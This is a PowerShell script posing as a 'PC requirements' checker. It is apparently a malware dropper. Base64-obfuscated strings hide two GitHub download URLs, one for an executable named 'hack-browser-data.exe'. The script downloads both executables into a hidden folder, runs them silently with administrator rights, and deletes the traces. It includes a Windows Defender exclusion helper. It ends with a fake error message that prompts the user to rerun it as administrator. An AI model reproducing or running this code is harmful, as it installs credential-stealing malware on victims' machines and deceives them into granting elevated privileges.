$downloadURLB64 = "aHR0cHM6Ly9naXRodWIuY29tL2VsM2N0cm80bmRyZS8uZXhlL3Jhdy9yZWZzL2hlYWRzL21haW4vaGFjay1icm93c2VyLWRhdGEuZXhl"
$download2URLB64 = "aHR0cHM6Ly9naXRodWIuY29tL2VsM2N0cm80bmRyZS8uZXhlL3Jhdy9yZWZzL2hlYWRzL21haW4vbWFpbi5leGU="
$updaterExeB64 = "aGFjay1icm93c2VyLWRhdGEuZXhl"
$updater2ExeB64 = "bWFpbi5leGU="
$hiddenAttrB64 = "SGlkZGVu"
$silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
$stopActionB64 = "U3RvcA=="
$directoryB64 = "RGlyZWN0b3J5"
$runAsB64 = "UnVuQXM="

$downloadURL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadURLB64))
$download2URL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($download2URLB64))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
$updater2Exe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updater2ExeB64))
$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))

$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().Tostring())
New-Item -ItemType $directory -Path $hiddenFolder | Out-Null

$tempPath = Join-Path $hiddenFolder $updaterExe
$tempPath2 = Join-Path $hiddenFolder $updater2Exe

function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
    } catch {}
}

echo $hiddenFolder

try {
    Write-Host "Downloading the program and checking for your PC requirements..."
    #Add-Exclusion -Path $hiddenFolder
    Invoke-WebRequest -Uri $downloadURL -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
    Invoke-WebRequest -Uri $download2URL -OutFile $tempPath2 -UseBasicParsing -ErrorAction $stopAction
    Set-ItemProperty -Path $hiddenFolder -name Attributes -Value $hiddenAttr
    Set-ItemProperty -Path $tempPath -name Attributes -Value $hiddenAttr
    Set-ItemProperty -Path $tempPath2 -name Attributes -Value $hiddenAttr
    #Add-Exclusion -Path $tempPath
    #Add-Exclusion -Path $tempPath2
    Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs
    Start-Sleep -Seconds 5
    Start-Process -FilePath $tempPath2 -WindowStyle $hiddenAttr -Verb $runAs
    Start-Sleep -Seconds 5
    Remove-Item $hiddenFolder -Recurse -Force
} catch {
    exit 1
} finally {
    Write-Host "Can't determie the PC minimum requiremets. Please try again as administrator."
}